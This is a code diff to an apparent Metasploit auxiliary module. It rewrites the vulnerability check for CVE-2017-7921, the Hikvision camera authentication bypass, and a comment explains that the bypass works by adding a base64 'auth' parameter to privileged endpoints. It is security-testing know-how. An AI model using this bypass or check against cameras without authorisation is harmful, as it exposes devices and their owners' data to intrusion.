@@ -85,7 +85,7 @@ class MetasploitModule < Msf::Auxiliary
     })
     return res
   rescue StandardError => e
-    print_error("#{peer} - Communication error occurred: #{e.message}")
+    print_error("Communication error occurred: #{e.message}")
     elog("#{peer} - Communication error occurred: #{e.message}", error: e)
     return nil
   end
@@ -308,16 +308,23 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
-    uri = normalize_uri(target_uri.path, 'System', 'time')
+    # CVE-2017-7921 is an authentication bypass: appending ?auth=<base64 admin:password> to a
+    # privileged endpoint returns protected data without valid credentials. get_info performs
+    # exactly that request with a random password, so a device that returns parseable Hikvision
+    # device data confirms both that the target is a Hikvision camera and that the bypass works.
+    # A generic HTTP 200 (e.g. an unrelated Apache server) does not satisfy this and is not vulnerable.
+    uri = normalize_uri(target_uri.path, 'System', 'deviceInfo')
     res = get_info(uri)
 
-    if res.nil?
-      return Exploit::CheckCode::Unknown('No response received from the target')
-    elsif res.code == 200
-      return Exploit::CheckCode::Vulnerable('Unauthenticated access to system time endpoint succeeded')
-    else
-      return Exploit::CheckCode::Safe("System time endpoint returned HTTP #{res.code}")
+    return Exploit::CheckCode::Unknown('No response received from the target') if res.nil?
+    return Exploit::CheckCode::Safe("Device info endpoint returned HTTP #{res.code}") unless res.code == 200
+
+    xml = res.get_xml_document
+    if xml.present? && xml.at_css('DeviceInfo model').present?
+      return Exploit::CheckCode::Vulnerable('Retrieved Hikvision device information via the unauthenticated auth bypass')
     end
+
+    Exploit::CheckCode::Safe('Response did not contain Hikvision device information; target does not appear to be a vulnerable camera')
   end
 
   def run
